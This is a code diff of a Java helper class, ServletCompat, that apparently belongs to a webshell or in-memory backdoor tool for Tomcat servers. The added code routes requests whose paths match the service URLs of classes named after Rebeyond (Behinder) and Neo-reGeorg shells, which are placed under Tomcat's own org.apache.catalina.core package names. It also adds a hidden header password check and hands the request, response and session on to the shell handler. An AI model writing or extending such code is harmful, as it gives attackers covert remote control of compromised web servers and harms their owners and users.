@@ -1,44 +1,50 @@
 package indi.augusttheodor.stage;
 
-import java.io.BufferedReader;
 import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Map;
 
-public class ServletCompat { //反射处理类
+public class ServletCompat {
+
     public static String AUTH_KEY = null;
     public static String AUTH_VALUE = null;
 
-    public static Map handle(Object request, Object response) throws Exception {
-        if (AUTH_KEY != null) {
-            String h = getHeader(request, AUTH_KEY);
-            if (h == null ? AUTH_VALUE != null : !h.equals(AUTH_VALUE)) {
+    public static Map handle(Object request, Object response) {
+        try {
+            String url = (String) invoke(request, "getServletPath");
+            if (url == null || !isShellUrl(url)) {
                 return null;
             }
+            if (AUTH_KEY != null) {
+                String h = getHeader(request, AUTH_KEY);
+                if (h == null ? AUTH_VALUE != null : !h.equals(AUTH_VALUE)) {
+                    return null;
+                }
+            }
+            Map s = new HashMap();
+            Map rdd = new HashMap();
+            rdd.put("url", url);
+            rdd.put("method", invoke(request, "getMethod"));
+            Object reader = invoke(request, "getReader");
+            rdd.put("b", reader == null ? null : reader.getClass().getMethod("readLine").invoke(reader));
+            s.put("rdd", rdd);
+            s.put("request", request);
+            s.put("response", response);
+            s.put("session", getSession(request));
+            return s;
+        } catch (Throwable t) {
+            return null;
         }
-        Map s = new HashMap();
-        s.put("rdd", getRequestData(request));
-        s.put("request", request);
-        s.put("response", response);
-        s.put("session", getSession(request));
-        return s;
+    }
+
+    private static boolean isShellUrl(String url) {
+        return url.matches("/(.*)" + org.apache.catalina.core.RebeyondServices.SERVICE_URL)
+                || url.matches("/(.*)" + org.apache.catalina.core.ExtendServices.SERVICE_URL)
+                || url.matches("/(.*)" + org.apache.catalina.core.NeoServices.SERVICE_URL);
     }
 
     public static Map getRdd(Object s) {
         return (Map) ((Map) s).get("rdd");
-    }
-
-    public static Map getRequestData(Object request) throws Exception {
-        Map rdd = new HashMap();
-        rdd.put("url", invoke(request, "getServletPath"));
-        rdd.put("method", invoke(request, "getMethod"));
-        Object reader = invoke(request, "getReader");
-        String line = null;
-        if (reader != null) {
-            line = (String) reader.getClass().getMethod("readLine").invoke(reader);
-        }
-        rdd.put("b", line);
-        return rdd;
     }
 
     public static Object getSession(Object request) throws Exception {
@@ -65,4 +71,3 @@ public class ServletCompat { //反射处理类
         return ts;
     }
 }
-
